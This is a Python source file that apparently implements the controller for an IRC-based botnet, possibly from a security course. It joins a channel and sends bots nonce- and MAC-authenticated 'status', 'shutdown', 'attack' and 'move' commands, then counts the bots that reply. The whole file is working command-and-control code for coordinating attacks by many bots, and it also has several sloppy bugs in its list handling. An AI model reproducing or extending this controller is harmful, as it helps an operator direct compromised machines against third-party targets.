# controller program for the ircbot.py program

#command line argument:
# ./irccontroller.py <hostname>:<port> <channel> <secret-phrase>

import argparse
import socket
import sys
import os
import hashlib
import shlex
import time
from array import *
import uuid
import select

used_nonces = list()

def parse_args():
    parser = argparse.ArgumentParser(
        prog='client',
        description='client connects to server')
    parser.add_argument('hostname_port', help='hostname and port of the server')
    parser.add_argument('channel', help='irc channel')
    parser.add_argument('secret', help='secret-phrase')
    return parser.parse_args()


def calc_nonce():
    #get random nonce make sure it hasnt been used before
    nonce = uuid.uuid4().hex    
    while(nonce in used_nonces):
        nonce = uuid.uuid4().hex

    #print("nonce: ", uuid.uuid4().hex)
    used_nonces.append(nonce)
    return nonce

def parse_message(data: str):

    print("parsing: \n", data)
    split = data.split()
    print(split)

    prefix = ''
    trailing = []
    if not data:
        print("no message")
        return prefix, "", ""
    if data[0] == ':':
        prefix, data = data[1:].split(' ', 1)
    if data.find(' :') != -1:
        data, trailing = data.split(' :', 1)
        channel_message = data.split()
        channel_message.append(trailing)
    else:
        channel_message = data.split()
    command = channel_message.pop(0)
    return prefix, command, channel_message


def recieve_status_data(sock: socket, channel: str):
    i = 0
    j = 0
    bot_status = list()
    parse_irc_data = []
    find_bot = list()
    while i < 5:
        read_data = [sock]
        write_data = []
        error_data = []
        readList, writeList, errorList = select.select(read_data, write_data, error_data, 1.0)
        if readList:
            response = sock.recv(1024).decode()
            bot_status.append(response)

        else:
            #waits for 5 seconds
            i = i + 1
    
    #find_bot = []
    for elem in bot_status:
        if(elem.find('! \r\n')):
            #print(elem.split('! \r\n'))
            elem_split = elem.split('\r\n')
            #find_bot.append(elem_split)
            for elem2 in elem_split:
                #if(elem2.find('shutdown') or elem2.find('status')):
                find_bot.append(elem2)
                #print(elem2)
                if(elem2.find("QUIT") != -1):
                    find_bot.remove(elem2)
    

    for i in find_bot:
        if(i == ""):
            find_bot.remove("")
        elif(i == "\r\n"):

            find_bot.remove(i)

    #print("BOT FOUND: ", find_bot)

    print("Result: ", len(find_bot), " bots discovered.")
    status_string = ""
    for bot in find_bot:
        print(bot)


def bot_controller(args: str, sock: socket):

    split_hostPort = args.hostname_port.split(":")
    host = split_hostPort[0]
    port = int(split_hostPort[1])
    secret = args.secret
    channel = "#" + args.channel

    command = input('cmd> ')
    while (1):

        # Flush data that was sent from bots
        #if a bot is created after the controller is turned on then will recieve extra input
        #response = sock.recv(1024).decode()
        read_data = [sock]
        write_data = []
        error_data = []
        readList, writeList, errorList = select.select(read_data, write_data, error_data, 1.0)
        if readList:
            response = sock.recv(1024).decode()
            print("recieved new data from bots: ")
            print(response)


        if command == "status":
            print("command status")
            print(channel)
            nonce = calc_nonce()
            mac = str(hashlib.sha256((nonce + secret).encode('utf-8')).hexdigest())
            #print("mac: ", mac[0:8])

            #nonce_mac_cmd = nonce + " " + mac[0:8] + " " + command      #[0:8] is for only taking the first 8 characters of the mac
            nonce_mac_cmd = 'PRIVMSG ' + channel + " :" + nonce + " " + mac[0:8] + " " + command + '! \r\n'
            #print("send command: ", nonce_mac_cmd)
            sock.send(nonce_mac_cmd.encode())
            recieve_status_data(sock, channel)

        elif command == "shutdown":
            #print("telling bot to shutdown")
            print("command shutdown")
            nonce = calc_nonce()
            mac = str(hashlib.sha256((nonce + secret).encode('utf-8')).hexdigest())
            #print("mac: ", mac[0:8])

            #nonce_mac_cmd = nonce + " " + mac[0:8] + " " + command      #[0:8] is for only taking the first 8 characters of the mac
            nonce_mac_cmd = 'PRIVMSG ' + channel + " :" + nonce + " " + mac[0:8] + " " + command + '! \r\n'
            #print("send command: ", nonce_mac_cmd)
            sock.send(nonce_mac_cmd.encode())
            recieve_status_data(sock, channel)
            #recieve_shutdown_data(sock)

        elif command[0:6] == "attack":
            print("attack command")
            nonce = calc_nonce()
            mac = str(hashlib.sha256((nonce + secret).encode('utf-8')).hexdigest())
            #print("mac: ", mac[0:8])

            #nonce_mac_cmd = nonce + " " + mac[0:8] + " " + command      #[0:8] is for only taking the first 8 characters of the mac
            nonce_mac_cmd = 'PRIVMSG ' + channel + " :" + nonce + " " + mac[0:8] + " " + command + '! \r\n'
            #print("send command: ", nonce_mac_cmd)
            sock.send(nonce_mac_cmd.encode())

            recieve_status_data(sock, channel)
            #recieve_attack_data(sock)

        elif command[0:4] == "move":
            print("move command")
            nonce = calc_nonce()
            mac = str(hashlib.sha256((nonce + secret).encode('utf-8')).hexdigest())
            #print("mac: ", mac[0:8])

            #nonce_mac_cmd = nonce + " " + mac[0:8] + " " + command      #[0:8] is for only taking the first 8 characters of the mac
            nonce_mac_cmd = 'PRIVMSG ' + channel + " :" + nonce + " " + mac[0:8] + " " + command + '! \r\n'
            #print("send command: ", nonce_mac_cmd)
            sock.send(nonce_mac_cmd.encode())

            recieve_status_data(sock, channel)
            #recieve_attack_data(sock)
        elif command == "quit":
            print("Bye.")
            exit(1)
        else:
            print("unknown command.")



        command = input('cmd> ')
    sock.send(command.encode)
    sock.close()



def main():
    args = parse_args()

    try:
        #initially connect to server
        split_hostPort = args.hostname_port.split(":")
        host = split_hostPort[0]
        port = int(split_hostPort[1])
        channel = "#" + args.channel

        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((host, port))

        nickname = 'controller'

        sendUser = 'USER '+ nickname +' '+ nickname +' '+ nickname +' :controller of bots!\n'
        sendNickname = "NICK "+ nickname +"\n"
        sendJoin = "JOIN "+ channel +"\n"

        client_socket.send(sendUser.encode()) 
        client_socket.send(sendNickname.encode())                           
        client_socket.send(sendJoin.encode())   

        text = client_socket.recv(1024).decode()  #receive the text
        print(text)   #print text to console

        print("Connected.")

        bot_controller(args, client_socket)

    except ConnectionError:
        print("Connection failed. Could not connect to server")


if __name__ == '__main__':
    main()